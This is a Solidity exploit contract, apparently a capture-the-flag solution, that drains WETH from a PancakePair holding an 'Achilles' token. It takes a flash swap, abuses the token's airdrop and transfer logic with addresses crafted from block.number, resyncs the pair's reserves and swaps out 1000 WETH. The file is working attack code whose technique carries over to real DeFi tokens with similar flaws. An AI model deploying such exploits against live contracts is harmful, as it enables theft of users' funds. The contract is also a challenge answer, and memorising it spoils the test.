// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Deployer.sol";

contract EXP {
    Deployer deployer;
    PancakePair pair;
    Achilles achilles;
    WETH weth;

    constructor(address _deployer) {
        deployer = Deployer(_deployer);
    }

    function hack() public {
        pair = PancakePair(deployer.pair());
        achilles = Achilles(deployer.achilles());
        weth = WETH(deployer.weth());
        pair.swap(9000 ether, 0, address(this), hex"00");

        address to = address(
            uint160(
                (uint160(address(this)) | block.number) ^
                    (uint160(address(this)) ^ uint160(address(pair)))
            )
        );
        achilles.transfer(to, 0);

        to = address(
            uint160(
                (uint160(address(this)) | block.number) ^
                    (uint160(address(this)) ^ uint160(address(this)))
            )
        );
        achilles.transfer(to, 0);

        pair.sync();

        achilles.transfer(address(pair), 1);
        pair.swap(0, 1000 ether, address(this), hex"01");

        // console.log("this weth balance: %s", weth.balanceOf(address(this)));

        require(deployer.isSolved());
    }

    function pancakeCall(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        achilles.airdrop(1);
        achilles.transfer(address(pair), amount0);
    }
}
